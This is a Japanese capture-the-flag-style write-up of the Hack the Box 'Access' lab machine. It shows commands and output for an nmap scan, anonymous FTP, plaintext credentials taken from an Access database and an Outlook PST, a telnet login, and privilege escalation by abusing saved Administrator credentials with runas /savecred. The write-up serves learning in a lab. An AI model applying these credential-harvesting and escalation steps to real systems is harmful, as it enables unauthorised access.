---
title: "【Hack the Box write-up】Access"
date:  "2020-10-18T15:04:05+07:00"
author:
  - "さんぽし"
draft: false
tags: ["writeup","Hack the Box"]
categories:
  - "security"
---

筆者は Hack the Box 初心者です。
何か訂正や補足、アドバイスなどありましたら、コメントか Twitter までお願いします。
[さんぽし(@sanpo_shiho) | Twitter](https://twitter.com/sanpo_shiho)

また、今回の記事はいつにも増して雑になってます:pray:
良い感じに意図を読み取ってください…

## cheat sheet

以下で cheat sheet としてツールの使い方などをまとめています。参考にしてください。
[github | sanposhiho/MY_CHEAT_SHEET](https://github.com/sanposhiho/MY_CHEAT_SHEET)

## machineについて
難易度は easy です。

![info card](/images/posts/hackthebox-access.png)

## nmap

```
kali@kali:~$ nmap -sC -sV 10.10.10.98
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 01:53 EDT
Nmap scan report for 10.10.10.98
Host is up (0.26s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.29 seconds
```

## 80番port

![スクショ](/images/posts/hackthebox-access1.png)

こんな感じのページが出てきます

## ftp

ftpのanonymous loginが許可されているので中を見てみると二つのファイルが手に入ります
binモードにしてgetしないとファイルが壊れた状態で来るので注意です

- Access Control.zip
- backup.mdb

## mdb-tables

```
kali@kali:~$ mdb-tables backup.mdb -1
acc_antiback
acc_door
acc_firstopen
acc_firstopen_emp
acc_holidays
acc_interlock
acc_levelset
acc_levelset_door_group
acc_linkageio
acc_map
acc_mapdoorpos
acc_morecardempgroup
acc_morecardgroup
acc_timeseg
acc_wiegandfmt
ACGroup
acholiday
ACTimeZones
action_log
AlarmLog
areaadmin
att_attreport
att_waitforprocessdata
attcalclog
attexception
AuditedExc
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
base_additiondata
base_appoption
base_basecode
base_datatranslation
base_operatortemplate
base_personaloption
base_strresource
base_strtranslation
base_systemoption
CHECKEXACT
CHECKINOUT
dbbackuplog
DEPARTMENTS
deptadmin
DeptUsedSchs
devcmds
devcmds_bak
django_content_type
django_session
EmOpLog
empitemdefine
EXCNOTES
FaceTemp
iclock_dstime
iclock_oplog
iclock_testdata
iclock_testdata_admin_area
iclock_testdata_admin_dept
LeaveClass
LeaveClass1
Machines
NUM_RUN
NUM_RUN_DEIL
operatecmds
personnel_area
personnel_cardtype
personnel_empchange
personnel_leavelog
ReportItem
SchClass
SECURITYDETAILS
ServerLog
SHIFT
TBKEY
TBSMSALLOT
TBSMSINFO
TEMPLATE
USER_OF_RUN
USER_SPEDAY
UserACMachines
UserACPrivilege
USERINFO
userinfo_attarea
UsersMachines
UserUpdates
worktable_groupmsg
worktable_instantmsg
worktable_msgtype
worktable_usrmsg
ZKAttendanceMonthStatistics
acc_levelset_emp
acc_morecardset
ACUnlockComb
AttParam
auth_group
AUTHDEVICE
base_option
dbapp_viewmodel
FingerVein
devlog
HOLIDAYS
personnel_issuecard
SystemLog
USER_TEMP_SCH
UserUsedSClasses
acc_monitor_log
OfflinePermitGroups
OfflinePermitUsers
OfflinePermitDoors
LossCard
TmpPermitGroups
TmpPermitUsers
TmpPermitDoors
ParamSet
acc_reader
acc_auxiliary
STD_WiegandFmt
CustomReport
ReportField
BioTemplate
FaceTempEx
FingerVeinEx
TEMPLATEEx
```

```
kali@kali:~$ mdb-sql -p backup.mdb 
1 => select * from auth_user
2 => go

id      username        password        Status  last_login      RoleID  Remark
25      admin   admin   1       08/23/18 21:11:47       26
27      engineer        access4u@security       1       08/23/18 21:13:36       26
28      backup_admin    admin   1       08/23/18 21:14:02       26
3 Rows retrieved
```

## 取得したzipを解凍

```
kali@kali:~$ 7z -paccess4u@security e Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-1068NG7 CPU @ 2.30GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

Everything is Ok

Size:       271360
Compressed: 10870
```

## 出てきたやつを調べる

Access Control.pstというあまり見かけない拡張子の物が出てきます

```
kali@kali:~$ file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

readpstというコマンドでコマンドラインからでも読めるようです
[Outlookのデータ（.pstファイル）をテキストに変換する（readpstコマンド利用）](http://min117.hatenablog.com/entry/2019/04/13/090304)

```
kali@kali:~$ readpst Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```
`Access Control.mbox` が出てきます

```
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-531969229_-_-"


----boundary-LibPST-iamunique-531969229_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-531969229_-_-"

--alt---boundary-LibPST-iamunique-531969229_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-531969229_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-531969229_-_---

----boundary-LibPST-iamunique-531969229_-_---
```

# telnet でログイン

`security / 4Cc3ssC0ntr0ller`

```
kali@kali:~$ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.

^]
telnet> help
Commands may be abbreviated.  Commands are:

close           close current connection
logout          forcibly logout remote user and close the connection
display         display operating parameters
mode            try to enter line or character mode ('mode ?' for more)
open            connect to a site
quit            exit telnet
send            transmit special characters ('send ?' for more)
set             set operating parameters ('set ?' for more)
unset           unset operating parameters ('unset ?' for more)
status          print status information
toggle          toggle operating parameters ('toggle ?' for more)
slc             set treatment of special characters

z               suspend telnet
environ         change environment variables ('environ ?' for more)
telnet> logout
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>

```

ログインできました
これでuser.txtが取れます

# PE
`C:\Users\Public\Desktop`によく分からない何かがあるので`type`コマンドで見てみます

```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
                                                                                                           runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                             �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
                                                                                 O�j)�H���
                                                                                          )ΰ[�_���8{E�3
                                                                                                       O�j)�H���
                                                                                                                )ΰ[�    ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500

```

分からないですが、なんかAdministratorとかって書いてありますね

「runas savecred」で取り敢えずググると以下のようなページが出てきます
[RUNAS を実行時にきかれるパスワードを自動で入力するスクリプト](https://hrkworks.com/it/windows-tips/auto-runas/)

runasで入力するcredentialを保存できるoptionがsavecredらしいですね
記事の最後に
> セキュリティー的には、実行終了時に以下のコマンドか、上述の資格情報マネージャで、街頭の資格情報を消すことをお勧めします。

とあります

cmdkey listで手元にあるcredentialの情報を見られるのでみてみます

```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    

```

Administratorおりますね
この保存されたcredentialを使ってroot.txtを読み取ります

```
C:\Users\security>runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root" 
```

これでrootを読めばflagが取れます

## 終わりに
久しぶりのHack the Box復帰戦でした。
またボチボチやっていきます
